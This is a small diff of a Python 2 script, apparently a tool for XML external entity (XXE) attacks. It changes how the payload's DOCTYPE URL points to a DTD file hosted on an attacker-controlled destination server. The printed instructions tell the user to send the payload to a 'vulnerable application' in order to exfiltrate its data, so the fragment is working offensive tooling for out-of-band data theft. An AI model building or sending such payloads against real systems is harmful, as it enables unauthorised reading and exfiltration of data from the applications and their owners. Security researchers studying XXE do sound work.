@@ -41,7 +41,7 @@ def main():
 
     print "To exfiltrate the data, send this XML entity to the vulnerable application, while hosting the above DTD file at your destination server: "
     xxe = """<?xml version="1.0"?>
-<!DOCTYPE foo SYSTEM "http://{0}/{1}.dtd">
+<!DOCTYPE foo SYSTEM "http://{0}/{1}">
 <foo>&e1;</foo>""".format(args.destination, dtd_file)
     print xxe
     return 0
